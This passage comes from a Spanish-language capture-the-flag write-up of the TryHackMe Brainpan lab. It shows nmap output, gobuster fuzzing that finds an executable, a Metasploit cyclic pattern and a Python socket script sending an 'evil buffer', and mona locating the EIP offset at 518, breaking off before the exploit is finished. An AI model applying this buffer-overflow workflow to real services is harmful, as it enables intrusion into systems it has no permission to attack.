+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x2</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="mi">0</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="mi">20</span>\<span class="n">n_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">n_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="mi">20</span>\<span class="n">x20_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="mi">20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="mi">20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">n_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="mi">20</span><span class="n">_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="mi">20</span><span class="n">_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">n_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="mi">20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20_</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="mi">20</span><span class="n">_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span><span class="n">_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">n</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x2</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="mi">0</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="mi">20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="mi">20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">n</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x2</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="mi">0</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="mi">20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="n">x20</span>\<span class="n">x20_</span>\<span class="o">|</span>\<span class="n">n</span>\<span class="n">n</span>\<span class="p">[</span><span class="n">________________________</span>\<span class="n">x20WELCOME</span>\<span class="n">x20TO</span>\<span class="n">x20BRAINPAN</span>\<span class="n">x</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="mi">20</span><span class="n">_________________________</span>\<span class="p">]</span>\<span class="n">n</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20ENTER</span>\<span class="n">x</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="mi">20</span><span class="n">THE</span>\<span class="n">x20PASSWORD</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="mi">20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">n</span>\<span class="n">n</span>\
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span><span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>
+</span></span><span class="line"><span class="cl"><span class="n">SF</span><span class="p">:</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span>\<span class="n">x20</span><span class="o">&gt;&gt;</span>\<span class="n">x20</span><span class="s2">&#34;);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Nmap</span> <span class="n">done</span><span class="p">:</span> <span class="mi">1</span> <span class="n">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="ow">in</span> <span class="mf">39.52</span> <span class="n">seconds</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nos fijamos en el puerto 10000 y hacemos fuzzing para encontrar rutas, en este caso hemos encontrado “/bin” , contiene un .exe por lo tanto nos le descargamos.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">gobuster</span> <span class="nb">dir</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.173.74</span><span class="p">:</span><span class="mi">10000</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirbuster</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="nb">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">x</span> <span class="n">php</span><span class="p">,</span><span class="n">html</span><span class="p">,</span><span class="n">txt</span><span class="p">,</span><span class="n">exe</span><span class="p">,</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="n">Gobuster</span> <span class="n">v3</span><span class="mf">.5</span>
+</span></span><span class="line"><span class="cl"><span class="n">by</span> <span class="n">OJ</span> <span class="n">Reeves</span> <span class="p">(</span><span class="nd">@TheColonial</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">Christian</span> <span class="n">Mehlmauer</span> <span class="p">(</span><span class="nd">@firefart</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Url</span><span class="p">:</span>                     <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.173.74</span><span class="p">:</span><span class="mi">10000</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Method</span><span class="p">:</span>                  <span class="n">GET</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Threads</span><span class="p">:</span>                 <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Wordlist</span><span class="p">:</span>                <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirbuster</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="nb">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Negative</span> <span class="n">Status</span> <span class="n">codes</span><span class="p">:</span>   <span class="mi">404</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">User</span> <span class="n">Agent</span><span class="p">:</span>              <span class="n">gobuster</span><span class="o">/</span><span class="mf">3.5</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Extensions</span><span class="p">:</span>              <span class="n">php</span><span class="p">,</span><span class="n">html</span><span class="p">,</span><span class="n">txt</span><span class="p">,</span><span class="n">exe</span><span class="p">,</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Timeout</span><span class="p">:</span>                 <span class="mi">10</span><span class="n">s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">27</span> <span class="mi">14</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">31</span> <span class="n">Starting</span> <span class="n">gobuster</span> <span class="ow">in</span> <span class="n">directory</span> <span class="n">enumeration</span> <span class="n">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">html</span>           <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">215</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="nb">bin</span>                  <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">0</span><span class="p">]</span> <span class="p">[</span><span class="o">--&gt;</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">Progress</span><span class="p">:</span> <span class="mi">8852</span> <span class="o">/</span> <span class="mi">1323366</span> <span class="p">(</span><span class="mf">0.67</span><span class="o">%</span><span class="p">)</span><span class="o">^</span><span class="n">C</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Keyboard</span> <span class="n">interrupt</span> <span class="n">detected</span><span class="p">,</span> <span class="n">terminating</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">27</span> <span class="mi">14</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">56</span> <span class="n">Finished</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Fuzzeamos para ver la cantidad de bytes que admite.</p>
+<p><img src="/p/brainpain-thm/1.png"
+	width="864"
+	height="185"
+	srcset="/p/brainpain-thm/1_hu4357773b8206f6e3cd2a2572c6bda247_57601_480x0_resize_box_3.png 480w, /p/brainpain-thm/1_hu4357773b8206f6e3cd2a2572c6bda247_57601_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="467"
+		data-flex-basis="1120px"
+	
+></p>
+<p>Creamos un patrón con msf del tamaño de 600 bytes.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <span class="m">600</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Lo aplicamos al script en la variable &ldquo;payload&rdquo;.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ip</span> <span class="o">=</span> <span class="s2">&#34;10.0.3.9&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">9999</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">prefix</span> <span class="o">=</span> <span class="s2">&#34;brain &#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">overflow</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="n">offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">retn</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">postfix</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">retn</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">postfix</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Sending evil buffer...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">buffer</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;latin-1&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Done!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Could not connect.&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Con mona encontramos el offset del EIP.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">!</span><span class="n">mona</span> <span class="n">findmsp</span> <span class="o">-</span><span class="n">distance</span> <span class="mi">600</span>
+</span></span><span class="line"><span class="cl"><span class="n">EIP</span> <span class="n">contains</span> <span class="n">normal</span> <span class="n">pattern</span> <span class="p">:</span> <span class="mh">0x33724132</span> <span class="p">(</span><span class="n">offset</span> <span class="mi">518</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Editamos el script.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
